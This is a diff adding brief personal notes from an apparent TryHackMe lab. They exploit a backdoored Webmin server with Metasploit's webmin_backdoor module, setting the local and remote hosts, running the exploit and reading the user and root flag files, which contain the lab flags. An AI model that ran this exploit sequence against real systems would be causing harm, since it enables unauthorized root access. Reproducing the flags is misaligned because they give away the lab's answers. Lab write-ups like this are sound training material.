@@ -1,0 +1,26 @@
+Date:Apr/08/2021
+Time:11:46
+
+https://10.10.224.55:10000/
+https://www.webmin.com/exploit.html
+https://github.com/rapid7/metasploit-framework/pull/12219
+https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search
+
+
+msf6 > search webmin_backdoor
+msf6 > use 0
+msf6 exploit(linux/http/webmin_backdoor) > set lhost tun0
+lhost => 10.2.65.134
+msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.224.55
+rhosts => 10.10.224.55
+msf6 exploit(linux/http/webmin_backdoor) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf6 exploit(linux/http/webmin_backdoor) > show optionsmsf6 exploit(linux/http/webmin_backdoor) > run
+cat /home/dark/uset.txt
+cat /home/dark/user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+cat /root/root.txt
+THM{UPDATE_YOUR_INSTALL}
+
+
